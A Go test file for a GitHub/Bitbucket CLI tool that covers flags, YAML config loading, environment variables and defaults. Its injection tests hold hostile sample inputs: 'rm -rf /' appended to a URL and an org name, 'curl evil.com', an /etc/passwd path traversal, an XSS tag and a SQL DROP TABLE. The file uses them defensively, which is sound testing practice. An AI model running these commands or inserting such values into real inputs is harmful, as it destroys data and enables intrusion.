package cli

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

func TestRootCommand(t *testing.T) {
	tests := []struct {
		name        string
		args        []string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "help command",
			args:        []string{"--help"},
			expectError: false,
		},
		{
			name:        "version info",
			args:        []string{"--version"},
			expectError: false,
		},
		{
			name:        "invalid flag",
			args:        []string{"--invalid-flag"},
			expectError: true,
			errorMsg:    "unknown flag",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Reset root command for each test
			cmd := createTestRootCommand()
			cmd.SetArgs(tt.args)

			var output bytes.Buffer
			cmd.SetOut(&output)
			cmd.SetErr(&output)

			err := cmd.Execute()

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error but got none")
				}
				if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error message to contain '%s', got: %v", tt.errorMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
			}
		})
	}
}

func TestConfigFileValidation(t *testing.T) {
	tests := []struct {
		name          string
		configContent string
		expectError   bool
		errorMsg      string
	}{
		{
			name: "valid config",
			configContent: `
provider: github
github:
  base_url: "https://api.github.com"
  token: "valid_token_here"
  organization: "test-org"
  team: "test-team"
logging:
  level: "info"
  format: "text"
`,
			expectError: false,
		},
		{
			name: "malicious config with command injection",
			configContent: `
provider: github
github:
  base_url: "https://api.github.com; rm -rf /"
  token: "token"
  organization: "org"
  team: "team"
`,
			expectError: false, // Config loading should succeed, validation should catch it
		},
		{
			name: "invalid YAML syntax",
			configContent: `
provider: github
github:
  base_url: https://api.github.com
  token: invalid_yaml_syntax: [
`,
			expectError: true,
			errorMsg:    "yaml",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create temporary config file
			tmpDir := t.TempDir()
			configFile := filepath.Join(tmpDir, "config.yaml")

			err := os.WriteFile(configFile, []byte(tt.configContent), 0600)
			if err != nil {
				t.Fatalf("Failed to create temp config file: %v", err)
			}

			// Reset viper for clean test
			viper.Reset()
			setDefaults()

			// Set config file
			viper.SetConfigFile(configFile)

			err = viper.ReadInConfig()

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error but got none")
				}
				if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error message to contain '%s', got: %v", tt.errorMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
			}
		})
	}
}

func TestSecureConfigHandling(t *testing.T) {
	tests := []struct {
		name   string
		envVar string
		value  string
	}{
		{
			name:   "token from environment",
			envVar: "GITHUB_REPLACE_GITHUB_TOKEN",
			value:  "test_token_from_env",
		},
		{
			name:   "org from environment",
			envVar: "GITHUB_REPLACE_GITHUB_ORGANIZATION",
			value:  "test_org_from_env",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Set environment variable
			oldValue := os.Getenv(tt.envVar)
			defer func() {
				if oldValue == "" {
					os.Unsetenv(tt.envVar)
				} else {
					os.Setenv(tt.envVar, oldValue)
				}
			}()

			os.Setenv(tt.envVar, tt.value)

			// Reset viper and reinitialize
			viper.Reset()
			setDefaults()
			viper.SetEnvPrefix("GITHUB_REPLACE")
			viper.AutomaticEnv()

			// Test that environment variable is picked up
			key := strings.ToLower(strings.TrimPrefix(tt.envVar, "GITHUB_REPLACE_"))
			key = strings.ReplaceAll(key, "_", ".")

			if viper.GetString(key) != tt.value {
				t.Errorf("Expected %s to be %s, got %s", key, tt.value, viper.GetString(key))
			}
		})
	}
}

func TestInputSanitization(t *testing.T) {
	maliciousInputs := []struct {
		name  string
		flag  string
		value string
	}{
		{
			name:  "command injection in org",
			flag:  "--org",
			value: "test-org; rm -rf /",
		},
		{
			name:  "command injection in team",
			flag:  "--team",
			value: "test-team && curl evil.com",
		},
		{
			name:  "path traversal in config",
			flag:  "--config",
			value: "../../../etc/passwd",
		},
		{
			name:  "script injection in token",
			flag:  "--token",
			value: "<script>alert('xss')</script>",
		},
		{
			name:  "sql injection in provider",
			flag:  "--provider",
			value: "github'; DROP TABLE users; --",
		},
	}

	for _, tt := range maliciousInputs {
		t.Run(tt.name, func(t *testing.T) {
			cmd := createTestRootCommand()
			cmd.SetArgs([]string{tt.flag, tt.value, "--help"})

			var output bytes.Buffer
			cmd.SetOut(&output)
			cmd.SetErr(&output)

			// Command should execute without crashing
			err := cmd.Execute()
			if err != nil && !strings.Contains(err.Error(), "unknown flag") {
				// Only fail if it's not about unknown flags (which is expected for some tests)
				t.Errorf("Command crashed with malicious input: %v", err)
			}

			// Verify malicious input doesn't get executed (this would be checked in actual validation)
			// For now, we just ensure the command doesn't crash
		})
	}
}

func TestDefaultsValidation(t *testing.T) {
	viper.Reset()
	setDefaults()

	tests := []struct {
		name     string
		key      string
		expected interface{}
	}{
		{
			name:     "default provider",
			key:      "provider",
			expected: "github",
		},
		{
			name:     "default github base URL",
			key:      "github.base_url",
			expected: "https://api.github.com",
		},
		{
			name:     "default max retries",
			key:      "github.max_retries",
			expected: 3,
		},
		{
			name:     "default log level",
			key:      "logging.level",
			expected: "info",
		},
		{
			name:     "default include patterns",
			key:      "processing.include_patterns",
			expected: []string{"*.go", "*.java", "*.js", "*.py", "*.ts", "*.jsx", "*.tsx"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			actual := viper.Get(tt.key)
			
			// Handle slice comparison
			if expectedSlice, ok := tt.expected.([]string); ok {
				actualSlice := viper.GetStringSlice(tt.key)
				if len(actualSlice) != len(expectedSlice) {
					t.Errorf("Expected %v, got %v", expectedSlice, actualSlice)
					return
				}
				for i, v := range expectedSlice {
					if actualSlice[i] != v {
						t.Errorf("Expected %v, got %v", expectedSlice, actualSlice)
						return
					}
				}
			} else if actual != tt.expected {
				t.Errorf("Expected %v, got %v", tt.expected, actual)
			}
		})
	}
}

func TestDebugModeDetection(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected bool
	}{
		{
			name:     "debug flag enabled",
			args:     []string{"--debug"},
			expected: true,
		},
		{
			name:     "debug log level",
			args:     []string{"--log-level", "debug"},
			expected: true,
		},
		{
			name:     "no debug",
			args:     []string{"--log-level", "info"},
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := createTestRootCommand()
			cmd.SetArgs(tt.args)

			// Parse flags
			cmd.ParseFlags(tt.args)

			actual := IsDebugMode()
			if actual != tt.expected {
				t.Errorf("Expected debug mode %v, got %v", tt.expected, actual)
			}
		})
	}
}

// Helper function to create a test root command
func createTestRootCommand() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "go-toolgit",
		Short: "Test CLI tool",
		RunE: func(cmd *cobra.Command, args []string) error {
			return nil
		},
	}

	// Add the same flags as the real root command
	cmd.PersistentFlags().StringVar(&cfgFile, "config", "", "config file")
	cmd.PersistentFlags().String("provider", "github", "Git provider")
	cmd.PersistentFlags().String("github-url", "", "GitHub base URL")
	cmd.PersistentFlags().String("token", "", "GitHub token")
	cmd.PersistentFlags().String("org", "", "GitHub organization")
	cmd.PersistentFlags().String("team", "", "GitHub team")
	cmd.PersistentFlags().String("bitbucket-url", "", "Bitbucket base URL")
	cmd.PersistentFlags().String("bitbucket-username", "", "Bitbucket username")
	cmd.PersistentFlags().String("bitbucket-password", "", "Bitbucket password")
	cmd.PersistentFlags().String("bitbucket-project", "", "Bitbucket project")
	cmd.PersistentFlags().String("log-level", "info", "Log level")
	cmd.PersistentFlags().String("log-format", "text", "Log format")
	cmd.PersistentFlags().Bool("debug", false, "Enable debug mode")
	cmd.PersistentFlags().Bool("gui", false, "Launch GUI")

	return cmd
}

// Benchmark tests for CLI performance
func BenchmarkRootCommandInit(b *testing.B) {
	for i := 0; i < b.N; i++ {
		viper.Reset()
		setDefaults()
	}
}

func BenchmarkConfigLoad(b *testing.B) {
	// Create a temporary config file
	tmpDir := b.TempDir()
	configFile := filepath.Join(tmpDir, "config.yaml")
	
	configContent := `
provider: github
github:
  base_url: "https://api.github.com"
  token: "test_token"
  organization: "test-org"
  team: "test-team"
`
	
	err := os.WriteFile(configFile, []byte(configContent), 0600)
	if err != nil {
		b.Fatalf("Failed to create temp config file: %v", err)
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		viper.Reset()
		setDefaults()
		viper.SetConfigFile(configFile)
		viper.ReadInConfig()
	}
}